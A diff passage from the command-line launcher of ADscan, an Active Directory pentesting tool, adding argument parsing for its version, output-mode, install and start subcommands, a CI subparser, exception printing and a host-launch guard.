+    _cleanup_legacy_adscan_sudo_alias()
+    # ADscan can be run as a normal user. Commands that require privileges will
+    # either request sudo when needed or (for install) re-exec via sudo with a
+    # minimal preserved environment.
+
+    FULL_VERSION = get_version()
+    parser = argparse.ArgumentParser(
+        description="ADscan: Active Directory Pentesting Tool.",
+        formatter_class=argparse.RawTextHelpFormatter,  # Allows for newlines in help text
+    )
+    # Global --version option (e.g. `adscan --version`)
+    parser.add_argument(
+        "--version",
+        action="store_true",
+        help="Show ADscan version and exit.",
+    )
+    # Global --output mode — propagates to adscan_core.output via
+    # ADSCAN_OUTPUT_MODE so structured consumers (adscan_web, agents)
+    # parse the canonical JSON envelope from docs/cli_style.md §2.
+    parser.add_argument(
+        "--output",
+        choices=["human", "json", "quiet"],
+        default=None,
+        help=(
+            "Output mode. 'human' (default) renders Rich panels/tables; "
+            "'json' emits one JSON envelope per operation to stdout; "
+            "'quiet' suppresses everything except the final JSON envelope."
+        ),
+    )
+    # subparsers = parser.add_subparsers(dest="command", help="Available commands. If no command is given, 'start' is assumed if the environment is set up.", required=False)
+    # ``metavar="command"`` keeps the usage synopsis to ``adscan ... command``
+    # (follows the convention used by `git`, `gh`, `docker`) so subcommands
+    # we want to hide (e.g. the work-in-progress ``tui``) don't leak into
+    # the curly-brace choices list at the top of ``--help``.
+    subparsers = parser.add_subparsers(
+        dest="command",
+        title="commands",
+        description="Run 'adscan <command> -h' for more information on a specific command.",
+        help="Available subcommands",
+        metavar="command",
+    )
+
+    install_parser = subparsers.add_parser(
+        "install", help="Install ADscan and its dependencies."
+    )
+    install_parser.add_argument(
+        "--only",
+        choices=["bloodhound", "rusthound", "pyenv"],
+        nargs="+",
+        help="Install only specific components (for QA testing). Use: --only bloodhound rusthound pyenv",
+    )
+    install_parser.add_argument(
+        "--dev",
+        action="store_true",
+        help=argparse.SUPPRESS,
+    )
+    install_parser.add_argument(
+        "--allow-low-disk",
+        action="store_true",
+        help="Continue installation even if free disk space is below 15GB (not recommended).",
+    )
+    install_parser.add_argument(
+        "--pull-timeout",
+        dest="pull_timeout",
+        type=int,
+        default=None,
+        help=(
+            "Docker pull timeout in seconds (default: 3600). "
+            "Set to 0 to disable the timeout."
+        ),
+    )
+    install_parser.add_argument(
+        "-v",
+        "--verbose",
+        action="store_true",
+        help="Enable verbose mode for detailed informational output.",
+    )
+    install_parser.add_argument(
+        "-d",
+        "--debug",
+        action="store_true",
+        help="Enable debug mode.",
+    )
+    start_parser = subparsers.add_parser(
+        "start", help="Start the ADscan interactive shell."
+    )
+    start_parser.add_argument(
+        "-v",
+        "--verbose",
+        action="store_true",
+        help="Enable verbose mode for detailed informational output.",
+    )
+    start_parser.add_argument(
+        "--dev",
+        action="store_true",
+        help=argparse.SUPPRESS,
+    )
+    start_parser.add_argument(
+        "-d",
+        "--debug",
+        action="store_true",
+        help="Enable debug mode.",
+    )
+    start_parser.add_argument(
+        "--tui",
+        action="store_true",
+        help="Launch the Textual-based TUI instead of the default prompt_toolkit shell.",
+    )
+    start_parser.add_argument(
+        "--show-structural",
+        action="store_true",
+        dest="show_structural",
+        help=(
+            "Show the STRUCTURAL band in the Tactical Findings panel "
+            "(INFO-severity edges that are part of the expected AD "
+            "hierarchy — Domain Admins, Enterprise Admins, DCs, SYSTEM). "
+            "Hidden by default to keep the panel focused on choke points."
+        ),
+    )
+    # Non-interactive CI scan for automated testing. The subparser is built by
+    # the module-level ``add_ci_subparser`` so the flag surface is importable
+    # (locked against the launcher pass-through SSOT by a contract test).
+    ci_parser = add_ci_subparser(subparsers)
 
 
 
@@ -31440,6 +32255,7 @@ if __name__ == "__main__":
         except Exception as _exc:
             from adscan_core import telemetry as _tm
             _tm.capture_exception(_exc)
+            print_exception(exception=_exc)
             parser.print_help()
         sys.exit(0)
 
@@ -31550,6 +32366,8 @@ if __name__ == "__main__":
     _guard_root_shell_without_user_context(args.command)
 
     _guard_container_runtime_launcher_contract(args.command)
+
+    _guard_host_direct_core_launch(args.command)
 
     if args.command == "install":
         install_success = False
@@ -31748,6 +32566,7 @@ if __name__ == "__main__":
         except Exception as _exc:
             from adscan_core import telemetry as _tm
             _tm.capture_exception(_exc)
+            print_exception(exception=_exc)
             sys.exit(1)
     # If a command was given but not matched (shouldn't happen if 'required=True' for subparsers,
     # but good for safety if 'required=False' or for the initial no-command case)
